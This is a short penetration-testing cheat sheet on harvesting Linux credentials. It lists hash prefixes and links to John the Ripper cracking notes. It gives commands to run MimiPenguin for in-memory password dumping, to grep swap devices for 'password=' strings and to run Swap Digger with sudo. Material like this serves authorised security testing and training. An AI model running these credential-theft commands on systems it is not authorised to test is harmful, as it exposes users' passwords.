# Linux Passwd / Shadow
### Password Hashes
```bash
$6$ = SHA-512
$5$ = SHA-256
$1$ = MD5
```
### John The Ripper
##### [Unshadow Linux Hashes Cracking](../../Tools/Credentials/JohnTheRipper/README.md#Unshadow-for-Linux-Hashes-Cracking)

##### [Crack Linux Hashes](../../Tools/Credentials/JohnTheRipper/README.md#Crack-Linux-Hashes)

### MimiPenguin
#### May be worth running both scripts.
##### Run as Shell Script
```bash
./mimipenguin.sh
```
##### Run as Python Script
```bash
python mimipenguin.py
```

### From Swap Memory
##### Find Swap File
```bash
swapon -s

cat /proc/swaps
```
##### Look for Passwords
```bash
# Assuming found swap file as /dev/sda5
strings /dev/sda5 | grep "password="
strings /dev/sda5 | grep "&password="
```
##### Using [Swap Digger](https://github.com/sevagas/swap_digger)
```bash
git clone https://github.com/sevagas/swap_digger.git
cd swap_digger
chmod +x swap_digger.sh
sudo ./swap_digger.sh -vx
```

# References
[statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

[theHarvester](https://github.com/laramies/theHarvester)

[smtp-user-enum](https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum)

[smtp_enum](https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_enum/)

[thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

[smb_login](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_login/)

[owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)

[Reverse brute-force attack](https://en.wikipedia.org/wiki/Brute-force_attack#Reverse_brute-force_attack)

[John The Ripper](https://www.openwall.com/john/)

[MimiPenguin](https://github.com/huntergregal/mimipenguin)

[Swap Digger](https://github.com/sevagas/swap_digger)